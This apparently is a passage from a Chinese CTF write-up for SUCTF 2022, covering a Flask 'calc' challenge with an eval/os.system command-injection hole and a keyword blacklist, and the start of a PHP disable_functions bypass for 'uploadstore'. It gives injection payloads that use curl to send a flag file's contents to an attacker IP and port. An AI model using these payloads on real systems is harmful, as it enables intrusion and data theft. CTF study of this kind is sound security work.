alt="image-20220425193321712"></p><center>再附一张图图</center><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> secure_filename<br><span class="hljs-keyword">import</span> time<br><br><br>app=Flask(__name__)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span>(<span class="hljs-params">s</span>):</span><br>    blacklist = [<span class="hljs-string">&#x27;import&#x27;</span>,<span class="hljs-string">&#x27;(&#x27;</span>,<span class="hljs-string">&#x27;)&#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-string">&#x27;;&#x27;</span>,<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;getattr&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;class&#x27;</span>,<span class="hljs-string">&#x27;subclasses&#x27;</span>,<span class="hljs-string">&#x27;mro&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>,<span class="hljs-string">&#x27;args&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;if&#x27;</span>,<span class="hljs-string">&#x27;subprocess&#x27;</span>,<span class="hljs-string">&#x27;file&#x27;</span>,<span class="hljs-string">&#x27;open&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;builtins&#x27;</span>,<span class="hljs-string">&#x27;compile&#x27;</span>,<span class="hljs-string">&#x27;execfile&#x27;</span>,<span class="hljs-string">&#x27;from_pyfile&#x27;</span>,<span class="hljs-string">&#x27;config&#x27;</span>,<span class="hljs-string">&#x27;local&#x27;</span>,<span class="hljs-string">&#x27;self&#x27;</span>,<span class="hljs-string">&#x27;item&#x27;</span>,<span class="hljs-string">&#x27;getitem&#x27;</span>,<span class="hljs-string">&#x27;getattribute&#x27;</span>,<span class="hljs-string">&#x27;func_globals&#x27;</span>,<span class="hljs-string">&#x27;__init__&#x27;</span>,<span class="hljs-string">&#x27;join&#x27;</span>,<span class="hljs-string">&#x27;__dict__&#x27;</span>]<br>    flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">for</span> no <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> no.lower() <span class="hljs-keyword">in</span> s.lower():<br>            flag= <span class="hljs-literal">False</span><br>            <span class="hljs-built_in">print</span>(no)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> flag<br>    <br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-string">&quot;欢迎来到SUctf2022&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/calc&quot;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">calc</span>():</span><br>    ip = request.remote_addr<br>    num = request.values.get(<span class="hljs-string">&quot;num&quot;</span>)<br>    log = <span class="hljs-string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="hljs-built_in">format</span>(time.strftime(<span class="hljs-string">&quot;%Y%m%d-%H%M%S&quot;</span>,time.localtime()),ip,num)<br>    <br>    <span class="hljs-keyword">if</span> waf(num):<br>        <span class="hljs-keyword">try</span>:<br>            data = <span class="hljs-built_in">eval</span>(num)<br>            os.system(log)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(data)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;waf!!&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">5000</span>)  <br></code></pre></td></tr></table></figure><p>flask的一道题目。可以看到 两个路由 <code>/  , /calc</code>  能用的就是 calc模块 还有一个过滤的函数</p><p>calc路由 num 参数可控</p><p>模仿上面的语句 <code>echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt</code> 做个测试</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204251944029.png" alt="image-20220425194425904"></p><p>可以发现 如果使用 # 进行截断 仍然可以执行命令</p><p>之后 空格 &#x3D;&gt; %09</p><p>最终payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>%<span class="hljs-number">23</span>%<span class="hljs-number">60</span>curl%<span class="hljs-number">09</span>ip%<span class="hljs-number">3</span>A<span class="hljs-number">4444</span>%<span class="hljs-number">3</span>Fa%<span class="hljs-number">3</span>D%<span class="hljs-number">5</span>C%<span class="hljs-number">60</span>cat%<span class="hljs-number">09</span>Th<span class="hljs-number">1</span>s%<span class="hljs-number">2</span>A%<span class="hljs-number">5</span>C%<span class="hljs-number">60</span>%<span class="hljs-number">60</span><br><span class="hljs-comment">#原始形式：1#`curlip:4444?a=\`catTh1s*\``</span><br><span class="hljs-comment">#另一种外带方式 `curl-XGET-Fxx=@tmp/log.txthttp://ip:port/`</span><br></code></pre></td></tr></table></figure><h2 id="uploadstore"><a href="#uploadstore" class="headerlink" title="uploadstore"></a>uploadstore</h2><p>我觉得挺不错的题目，但是做起来好麻烦</p><p>我直接传了一个phpinfo 发现可以执行 但是 <strong>disable_functions</strong> ban了好多</p><p>经典老活儿</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$arr</span> = get_defined_functions()[<span class="hljs-string">&#x27;internal&#x27;</span>];<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/zend_version|func_num_args|func_get_arg|func_get_args|strcmp|strncmp|strcasecmp|strncasecmp|each|error_log|defined|get_class|get_called_class|get_parent_class|method_exists|property_exists|class_exists|interface_exists|trait_exists|function_exists|class_alias|get_included_files|get_required_files|is_subclass_of|is_a|get_class_vars|get_object_vars|get_mangled_object_vars|get_class_methods|trigger_error|user_error|restore_error_handler|set_exception_handler|restore_exception_handler|get_declared_classes|get_declared_traits|get_declared_interfaces|get_defined_functions|get_defined_vars|create_function|get_resource_type|get_resources|get_loaded_extensions|extension_loaded|get_extension_funcs|get_defined_constants|debug_backtrace|debug_print_backtrace|gc_mem_caches|gc_collect_cycles|gc_enabled|gc_enable|gc_disable|gc_status|strtotime|date|idate|gmdate|mktime|gmmktime|checkdate|strftime|gmstrftime|time|localtime|getdate|date_create|date_create_immutable|date_create_from_format|date_create_immutable_from_format|date_parse|date_parse_from_format|date_get_last_errors|date_format|date_modify|date_add|date_sub|date_timezone_get|date_timezone_set|date_offset_get|date_diff|date_time_set|date_date_set|date_isodate_set|date_timestamp_set|date_timestamp_get|timezone_open|timezone_name_get|timezone_name_from_abbr|timezone_offset_get|timezone_transitions_get|timezone_location_get|timezone_identifiers_list|timezone_abbreviations_list|timezone_version_get|date_interval_create_from_date_string|date_interval_format|date_default_timezone_set|date_default_timezone_get|date_sunrise|date_sunset|date_sun_info|libxml_set_streams_context|libxml_use_internal_errors|libxml_get_last_error|libxml_clear_errors|libxml_get_errors|libxml_disable_entity_loader|libxml_set_external_entity_loader|openssl_get_cert_locations|openssl_spki_new|openssl_spki_verify|openssl_spki_export|openssl_spki_export_challenge|openssl_pkey_free|openssl_pkey_new|openssl_pkey_export|openssl_pkey_export_to_file|openssl_pkey_get_private|openssl_pkey_get_public|openssl_pkey_get_details|openssl_free_key|openssl_get_privatekey|openssl_get_publickey|openssl_x509_read|openssl_x509_free|openssl_x509_parse|openssl_x509_checkpurpose|openssl_x509_check_private_key|openssl_x509_verify|openssl_x509_export|openssl_x509_fingerprint|openssl_x509_export_to_file|openssl_pkcs12_export|openssl_pkcs12_export_to_file|openssl_pkcs12_read|openssl_csr_new|openssl_csr_export|openssl_csr_export_to_file|openssl_csr_sign|openssl_csr_get_subject|openssl_csr_get_public_key|openssl_digest|openssl_encrypt|openssl_decrypt|openssl_cipher_iv_length|openssl_sign|openssl_verify|openssl_seal|openssl_open|openssl_pbkdf2|openssl_pkcs7_verify|openssl_pkcs7_decrypt|openssl_pkcs7_sign|openssl_pkcs7_encrypt|openssl_pkcs7_read|openssl_private_encrypt|openssl_private_decrypt|openssl_public_encrypt|openssl_public_decrypt|openssl_get_md_methods|openssl_get_cipher_methods|openssl_get_curve_names|openssl_dh_compute_key|openssl_pkey_derive|openssl_random_pseudo_bytes|openssl_error_string|preg_match_all|preg_replace|preg_replace_callback|preg_replace_callback_array|preg_filter|preg_split|preg_quote|preg_grep|preg_last_error|readgzfile|gzrewind|gzclose|gzeof|gzgetc|gzgets|gzgetss|gzread|gzopen|gzpassthru|gzseek|gztell|gzwrite|gzputs|gzfile|gzcompress|gzuncompress|gzdeflate|gzinflate|gzencode|gzdecode|zlib_encode|zlib_decode|zlib_get_coding_type|deflate_init|deflate_add|inflate_init|inflate_add|inflate_get_status|inflate_get_read_len|ob_gzhandler|filter_input|filter_var|filter_input_array|filter_var_array|filter_list|filter_has_var|filter_id|hash|hash_file|hash_hmac|hash_hmac_file|hash_init|hash_update|hash_update_stream|hash_update_file|hash_final|hash_copy|hash_algos|hash_hmac_algos|hash_pbkdf2|hash_equals|hash_hkdf|mhash_keygen_s2k|mhash_get_block_size|mhash_get_hash_name|mhash_count|mhash|session_name|session_module_name|session_save_path|session_id|session_create_id|session_regenerate_id|session_decode|session_encode|session_start|session_destroy|session_unset|session_gc|session_set_save_handler|session_cache_limiter|session_cache_expire|session_set_cookie_params|session_get_cookie_params|session_write_close|session_abort|session_reset|session_status|session_register_shutdown|session_commit|sodium_crypto_aead_aes256gcm_is_available|sodium_crypto_aead_aes256gcm_decrypt|sodium_crypto_aead_aes256gcm_encrypt|sodium_crypto_aead_aes256gcm_keygen|sodium_crypto_aead_chacha20poly1305_decrypt|sodium_crypto_aead_chacha20poly1305_encrypt|sodium_crypto_aead_chacha20poly1305_keygen|sodium_crypto_aead_chacha20poly1305_ietf_decrypt|sodium_crypto_aead_chacha20poly1305_ietf_encrypt|sodium_crypto_aead_chacha20poly1305_ietf_keygen|sodium_crypto_aead_xchacha20poly1305_ietf_decrypt|sodium_crypto_aead_xchacha20poly1305_ietf_keygen|sodium_crypto_aead_xchacha20poly1305_ietf_encrypt|sodium_crypto_auth|sodium_crypto_auth_keygen|sodium_crypto_auth_verify|sodium_crypto_box|sodium_crypto_box_keypair|sodium_crypto_box_seed_keypair|sodium_crypto_box_keypair_from_secretkey_and_publickey|sodium_crypto_box_open|sodium_crypto_box_publickey|sodium_crypto_box_publickey_from_secretkey|sodium_crypto_box_seal|sodium_crypto_box_seal_open|sodium_crypto_box_secretkey|sodium_crypto_kx_keypair|sodium_crypto_kx_publickey|sodium_crypto_kx_secretkey|sodium_crypto_kx_seed_keypair|sodium_crypto_kx_client_session_keys|sodium_crypto_kx_server_session_keys|sodium_crypto_generichash|sodium_crypto_generichash_keygen|sodium_crypto_generichash_init|sodium_crypto_generichash_update|sodium_crypto_generichash_final|sodium_crypto_kdf_derive_from_key|sodium_crypto_kdf_keygen|sodium_crypto_pwhash|sodium_crypto_pwhash_str|sodium_crypto_pwhash_str_verify|sodium_crypto_pwhash_str_needs_rehash|sodium_crypto_pwhash_scryptsalsa208sha256|sodium_crypto_pwhash_scryptsalsa208sha256_str|sodium_crypto_pwhash_scryptsalsa208sha256_str_verify|sodium_crypto_scalarmult|sodium_crypto_secretbox|sodium_crypto_secretbox_keygen|sodium_crypto_secretbox_open|sodium_crypto_secretstream_xchacha20poly1305_keygen|sodium_crypto_secretstream_xchacha20poly1305_init_push|sodium_crypto_secretstream_xchacha20poly1305_push|sodium_crypto_secretstream_xchacha20poly1305_init_pull|sodium_crypto_secretstream_xchacha20poly1305_pull|sodium_crypto_secretstream_xchacha20poly1305_rekey|sodium_crypto_shorthash|sodium_crypto_shorthash_keygen|sodium_crypto_sign|sodium_crypto_sign_detached|sodium_crypto_sign_ed25519_pk_to_curve25519|sodium_crypto_sign_ed25519_sk_to_curve25519|sodium_crypto_sign_keypair|sodium_crypto_sign_keypair_from_secretkey_and_publickey|sodium_crypto_sign_open|sodium_crypto_sign_publickey|sodium_crypto_sign_secretkey|sodium_crypto_sign_publickey_from_secretkey|sodium_crypto_sign_seed_keypair|sodium_crypto_sign_verify_detached|sodium_crypto_stream|sodium_crypto_stream_keygen|sodium_crypto_stream_xor|sodium_add|sodium_compare|sodium_increment|sodium_memcmp|sodium_memzero|sodium_pad|sodium_unpad|sodium_bin2hex|sodium_hex2bin|sodium_bin2base64|sodium_base642bin|sodium_crypto_scalarmult_base|spl_classes|spl_autoload|spl_autoload_extensions|spl_autoload_register|spl_autoload_unregister|spl_autoload_functions|spl_autoload_call|class_parents|class_implements|class_uses|spl_object_hash|spl_object_id|iterator_to_array|iterator_count|iterator_apply|constant|bin2hex|hex2bin|sleep|usleep|time_nanosleep|time_sleep_until|strptime|flush|wordwrap|htmlspecialchars|htmlentities|html_entity_decode|htmlspecialchars_decode|get_html_translation_table|sha1|sha1_file|md5_file|crc32|iptcparse|iptcembed|getimagesize|getimagesizefromstring|image_type_to_mime_type|image_type_to_extension|phpversion|phpcredits|php_sapi_name|php_uname|php_ini_scanned_files|php_ini_loaded_file|strnatcmp|strnatcasecmp|substr_count|strspn|strcspn|strtok|strtoupper|ini_set|strpos|stripos|strrpos|strripos|strrev|hebrev|hebrevc|nl2br|basename|dirname|stripslashes|stripcslashes|stristr|strrchr|str_shuffle|str_word_count|str_split|strpbrk|substr_compare|utf8_encode|utf8_decode|strcoll|money_format|substr|substr_replace|quotemeta|ucfirst|lcfirst|ucwords|strtr|addslashes|addcslashes|rtrim|str_replace|str_ireplace|str_repeat|count_chars|chunk_split|trim|ltrim|strip_tags|similar_text|explode|implode|join|setlocale|localeconv|nl_langinfo|soundex|levenshtein|chr|ord|parse_str|str_getcsv|str_pad|chop|strchr|sprintf|printf|vprintf|vsprintf|fprintf|vfprintf|sscanf|fscanf|parse_url|urlencode|urldecode|rawurlencode|rawurldecode|http_build_query|readlink|linkinfo|symlink|link|unlink|exec|system|escapeshellcmd|passthru|shell_exec|proc_open|proc_close|proc_terminate|proc_get_status|proc_nice|rand|srand|getrandmax|mt_rand|mt_srand|mt_getrandmax|random_bytes|random_int|getservbyname|getservbyport|getprotobyname|getprotobynumber|getmyuid|getmygid|getmypid|getmyinode|getlastmod|password_hash|password_get_info|password_needs_rehash|password_verify|password_algos|convert_uuencode|convert_uudecode|abs|ceil|floor|round|sin|cos|tan|asin|acos|atan|atanh|atan2|sinh|cosh|tanh|asinh|acosh|expm1|log1p|pi|is_finite|is_nan|is_infinite|pow|exp|log|log10|sqrt|hypot|deg2rad|rad2deg|bindec|hexdec|octdec|decbin|decoct|dechex|base_convert|number_format|fmod|intdiv|inet_ntop|inet_pton|ip2long|long2ip|getenv|getopt|sys_getloadavg|microtime|gettimeofday|getrusage|hrtime|uniqid|quoted_printable_decode|quoted_printable_encode|convert_cyr_string|get_current_user|set_time_limit|header_register_callback|get_cfg_var|get_magic_quotes_gpc|get_magic_quotes_runtime|error_get_last|error_clear_last|call_user_func|call_user_func_array|forward_static_call|forward_static_call_array|serialize|unserialize|var_dump|var_export|debug_zval_dump|print_r|memory_get_usage|memory_get_peak_usage|register_shutdown_function|register_tick_function|unregister_tick_function|highlight_file|highlight_string|php_strip_whitespace|ini_get|ini_get_all|ini_alter|ini_restore|get_include_path|set_include_path|restore_include_path|setcookie|setrawcookie|header|header_remove|headers_sent|headers_list|http_response_code|connection_aborted|connection_status|ignore_user_abort|parse_ini_file|parse_ini_string|is_uploaded_file|gethostbyaddr|gethostbyname|gethostbynamel|gethostname|net_get_interfaces|dns_check_record|checkdnsrr|dns_get_mx|getmxrr|dns_get_record|intval|floatval|doubleval|strval|boolval|gettype|settype|is_null|is_resource|is_bool|is_int|is_float|is_integer|is_long|is_double|is_real|is_numeric|is_string|is_array|is_object|is_scalar|is_callable|is_iterable|is_countable|pclose|popen|readfile|rewind|rmdir|umask|fclose|feof|fgetc|fgets|fgetss|fread|fopen|fpassthru|ftruncate|fstat|fseek|ftell|fflush|fwrite|fputs|mkdir|rename|copy|tempnam|tmpfile|file|file_put_contents|stream_select|stream_context_create|stream_context_set_params|stream_context_get_params|stream_context_set_option|stream_context_get_options|stream_context_get_default|stream_context_set_default|stream_filter_prepend|stream_filter_append|stream_filter_remove|stream_socket_client|stream_socket_server|stream_socket_accept|stream_socket_get_name|stream_socket_recvfrom|stream_socket_sendto|stream_socket_enable_crypto|stream_socket_shutdown|stream_socket_pair|stream_copy_to_stream|stream_get_contents|stream_supports_lock|stream_isatty|fgetcsv|fputcsv|flock|get_meta_tags|stream_set_read_buffer|stream_set_write_buffer|set_file_buffer|stream_set_chunk_size|stream_set_blocking|socket_set_blocking|stream_get_meta_data|stream_get_line|stream_wrapper_register|stream_register_wrapper|stream_wrapper_unregister|stream_wrapper_restore|stream_get_wrappers|stream_get_transports|stream_resolve_include_path|stream_is_local|get_headers|stream_set_timeout|socket_set_timeout|socket_get_status|realpath|fnmatch|fsockopen|pfsockopen|pack|unpack|get_browser|crypt|opendir|closedir|chdir|getcwd|rewinddir|readdir|dir|scandir|glob|fileatime|filectime|filegroup|fileinode|filemtime|fileowner|fileperms|filesize|filetype|file_exists|is_writable|is_writeable|is_readable|is_executable|is_file|is_dir|is_link|stat|lstat|chown|chgrp|lchown|lchgrp|chmod|touch|clearstatcache|disk_total_space|disk_free_space|diskfreespace|realpath_cache_size|realpath_cache_get|ezmlm_hash|openlog|syslog|closelog|lcg_value|metaphone|ob_start|ob_flush|ob_clean|ob_end_flush|ob_end_clean|ob_get_flush|ob_get_clean|ob_get_length|ob_get_level|ob_get_status|ob_get_contents|ob_implicit_flush|ob_list_handlers|ksort|krsort|natsort|natcasesort|asort|arsort|sort|rsort|usort|uasort|uksort|shuffle|array_walk|array_walk_recursive|count|end|prev|next|reset|current|key|min|max|in_array|array_search|extract|compact|array_fill|array_fill_keys|range|array_multisort|array_push|array_pop|array_shift|array_unshift|array_splice|array_slice|array_merge|array_merge_recursive|array_replace|array_replace_recursive|array_keys|array_key_first|array_key_last|array_values|array_count_values|array_column|array_reverse|array_reduce|array_pad|array_flip|array_change_key_case|array_rand|array_unique|array_intersect|array_intersect_key|array_intersect_ukey|array_uintersect|array_intersect_assoc|array_uintersect_assoc|array_intersect_uassoc|array_uintersect_uassoc|array_diff|array_diff_key|array_diff_ukey|array_udiff|array_diff_assoc|array_udiff_assoc|array_diff_uassoc|array_udiff_uassoc|array_sum|array_product|array_filter|array_map|array_chunk|array_combine|array_key_exists|pos|sizeof|key_exists|assert|assert_options|version_compare|ftok|str_rot13|stream_get_filters|stream_filter_register|stream_bucket_make_writeable|stream_bucket_prepend|stream_bucket_append|stream_bucket_new|output_add_rewrite_var|output_reset_rewrite_vars|sys_get_temp_dir|apache_lookup_uri|virtual|apache_request_headers|apache_response_headers|apache_getenv|apache_note|apache_get_version|apache_get_modules|getallheaders|xxhash32|xxhash64|pdo_drivers|xml_parser_create|xml_parser_create_ns|xml_set_object|xml_set_element_handler|xml_set_character_data_handler|xml_set_processing_instruction_handler|xml_set_default_handler|xml_set_unparsed_entity_decl_handler|xml_set_notation_decl_handler|xml_set_external_entity_ref_handler|xml_set_start_namespace_decl_handler|xml_set_end_namespace_decl_handler|xml_parse|xml_parse_into_struct|xml_get_error_code|xml_error_string|xml_get_current_line_number|xml_get_current_column_number|xml_get_current_byte_index|xml_parser_free|xml_parser_set_option|xml_parser_get_option|jdtogregorian|gregoriantojd|jdtojulian|juliantojd|jdtojewish|jewishtojd|jdtofrench|gmp_prob_prime|gmp_gcd|gmp_gcdext|gmp_lcm|gmp_invert|gmp_jacobi|gmp_legendre|gmp_kronecker|gmp_cmp|gmp_sign|gmp_random|gmp_random_seed|gmp_random_bits|gmp_random_range|gmp_and|gmp_or|gmp_com|gmp_xor|gmp_setbit|gmp_clrbit|gmp_testbit|gmp_scan0|gmp_scan1|gmp_popcount|gmp_hamdist|gmp_nextprime|gmp_binomial|iconv|iconv_get_encoding|iconv_set_encoding|iconv_strlen|iconv_substr|iconv_strpos|iconv_strrpos|iconv_mime_encode|iconv_mime_decode|iconv_mime_decode_headers|json_encode|json_decode|json_last_error|json_last_error_msg|mb_convert_case|mb_strtoupper|mb_strtolower|mb_language|mb_internal_encoding|mb_http_input|mb_http_output|mb_detect_order|mb_substitute_character|mb_parse_str|mb_output_handler|mb_preferred_mime_name|mb_str_split|mb_strlen|mb_strpos|mb_strrpos|mb_stripos|mb_strripos|mb_strstr|mb_strrchr|mb_stristr|mb_strrichr|mb_substr_count|mb_substr|mb_strcut|mb_strwidth|mb_strimwidth|mb_convert_encoding|mb_detect_encoding|mb_list_encodings|mb_encoding_aliases|mb_convert_kana|mb_encode_mimeheader|mb_decode_mimeheader|mb_convert_variables|mb_encode_numericentity|mb_decode_numericentity|mb_send_mail|mb_get_info|mb_check_encoding|mb_ord|mb_chr|mb_scrub|mb_regex_encoding|mb_regex_set_options|mb_ereg|mb_eregi|mb_ereg_replace|mb_eregi_replace|mb_ereg_replace_callback|mb_split|mb_ereg_match|mb_ereg_search|mb_ereg_search_pos|mb_ereg_search_regs|mb_ereg_search_init|mb_ereg_search_getregs|mb_ereg_search_getpos|mb_ereg_search_setpos|mbregex_encoding|mbereg|mberegi|mbereg_replace|mberegi_replace|mbsplit|mbereg_match|mbereg_search|mbereg_search_pos|mbereg_search_regs|mbereg_search_init|mbereg_search_getregs|mbereg_search_getpos|mbereg_search_setpos|mysqli_affected_rows|mysqli_autocommit|mysqli_begin_transaction|mysqli_change_user|mysqli_character_set_name|mysqli_close|mysqli_commit|mysqli_connect|mysqli_connect_errno|mysqli_connect_error|mysqli_data_seek|mysqli_dump_debug_info|mysqli_debug|mysqli_errno|mysqli_error|mysqli_error_list|mysqli_stmt_execute|mysqli_execute|mysqli_fetch_field|mysqli_fetch_fields|mysqli_fetch_field_direct|mysqli_fetch_lengths|mysqli_fetch_all|mysqli_fetch_array|mysqli_fetch_assoc|mysqli_fetch_object|mysqli_fetch_row|mysqli_field_count|mysqli_field_seek|mysqli_field_tell|mysqli_free_result|mysqli_get_connection_stats|mysqli_get_client_stats|mysqli_get_charset|mysqli_get_client_info|mysqli_get_client_version|mysqli_get_links_stats|mysqli_get_host_info|mysqli_get_proto_info|mysqli_get_server_info|mysqli_get_server_version|mysqli_get_warnings|mysqli_init|mysqli_info|mysqli_insert_id|mysqli_kill|mysqli_more_results|mysqli_multi_query|mysqli_next_result|mysqli_num_fields|mysqli_num_rows|mysqli_options|mysqli_ping|mysqli_poll|mysqli_prepare|mysqli_report|mysqli_query|mysqli_real_connect|mysqli_real_escape_string|mysqli_real_query|mysqli_reap_async_query|mysqli_release_savepoint|mysqli_rollback|mysqli_savepoint|mysqli_select_db|mysqli_set_charset|mysqli_stmt_affected_rows|mysqli_stmt_attr_get|mysqli_stmt_attr_set|mysqli_stmt_bind_param|mysqli_stmt_bind_result|mysqli_stmt_close|mysqli_stmt_data_seek|mysqli_stmt_errno|mysqli_stmt_error|mysqli_stmt_error_list|mysqli_stmt_fetch|mysqli_stmt_field_count|mysqli_stmt_free_result|mysqli_stmt_get_result|mysqli_stmt_get_warnings|mysqli_stmt_init|mysqli_stmt_insert_id|mysqli_stmt_more_results|mysqli_stmt_next_result|mysqli_stmt_num_rows|mysqli_stmt_param_count|mysqli_stmt_prepare|mysqli_stmt_reset|mysqli_stmt_result_metadata|mysqli_stmt_send_long_data|mysqli_stmt_store_result|mysqli_stmt_sqlstate|mysqli_sqlstate|mysqli_ssl_set|mysqli_stat|mysqli_store_result|mysqli_thread_id|mysqli_thread_safe|mysqli_use_result|mysqli_warning_count|mysqli_refresh|mysqli_escape_string|mysqli_set_opt|posix_kill|posix_getpid|posix_getppid|posix_getuid|posix_setuid|posix_geteuid|posix_seteuid|posix_getgid|posix_setgid|posix_getegid|posix_setegid|posix_getgroups|posix_getlogin|posix_getpgrp|posix_setsid|posix_setpgid|posix_getpgid|posix_getsid|posix_uname|posix_times|posix_ctermid|posix_ttyname|posix_isatty|posix_getcwd|posix_mkfifo|posix_mknod|posix_access|posix_getgrnam|posix_getgrgid|posix_getpwnam|posix_getpwuid|posix_getrlimit|posix_setrlimit|posix_get_last_error|posix_errno|posix_strerror|posix_initgroups|readline|readline_info|readline_add_history|readline_clear_history|readline_list_history|readline_read_history|readline_write_history|readline_completion_function|readline_callback_handler_install|readline_callback_read_char|readline_callback_handler_remove|readline_redisplay|readline_on_new_line|shmop_open|shmop_read|shmop_close|shmop_size|shmop_write|shmop_delete|simplexml_load_file|simplexml_load_string|simplexml_import_dom|socket_select|socket_create|socket_create_listen|socket_create_pair|socket_accept|socket_set_nonblock|socket_set_block|socket_listen|socket_close|socket_write|socket_read|socket_getsockname|socket_getpeername|socket_connect|socket_strerror|socket_bind|socket_recv|socket_send|socket_recvfrom|socket_sendto|socket_get_option|socket_set_option|socket_shutdown|socket_last_error|socket_clear_error|socket_import_stream|socket_export_stream|socket_sendmsg|socket_recvmsg|socket_cmsg_space|socket_addrinfo_lookup|socket_addrinfo_connect|socket_addrinfo_bind|socket_addrinfo_explain|socket_getopt|socket_setopt|msg_get_queue|msg_send|msg_receive|msg_remove_queue|msg_stat_queue|msg_set_queue|msg_queue_exists|sem_get|sem_acquire|sem_release|sem_remove|shm_attach|shm_remove|shm_detach|shm_put_var|shm_has_var|shm_get_var|shm_remove_var|token_get_all|token_name|xmlwriter_open_uri|xmlwriter_open_memory|xmlwriter_set_indent|xmlwriter_set_indent_string|xmlwriter_start_comment|xmlwriter_end_comment|xmlwriter_start_attribute|xmlwriter_end_attribute|xmlwriter_write_attribute|xmlwriter_start_attribute_ns|xmlwriter_write_attribute_ns|xmlwriter_start_element|xmlwriter_end_element|xmlwriter_full_end_element|xmlwriter_start_element_ns|xmlwriter_write_element|xmlwriter_write_element_ns|xmlwriter_start_pi|xmlwriter_end_pi|xmlwriter_write_pi|xmlwriter_start_cdata|xmlwriter_end_cdata|xmlwriter_write_cdata|xmlwriter_text|xmlwriter_write_raw|xmlwriter_start_document|xmlwriter_end_document|xmlwriter_write_comment|xmlwriter_start_dtd|xmlwriter_end_dtd|xmlwriter_write_dtd|xmlwriter_start_dtd_element|xmlwriter_end_dtd_element|xmlwriter_write_dtd_element|xmlwriter_start_dtd_attlist|xmlwriter_end_dtd_attlist|xmlwriter_write_dtd_attlist|xmlwriter_start_dtd_entity|xmlwriter_end_dtd_entity|xmlwriter_write_dtd_entity|xmlwriter_output_memory|xmlwriter_flush|zip_open|zip_close|zip_read|zip_entry_open|zip_entry_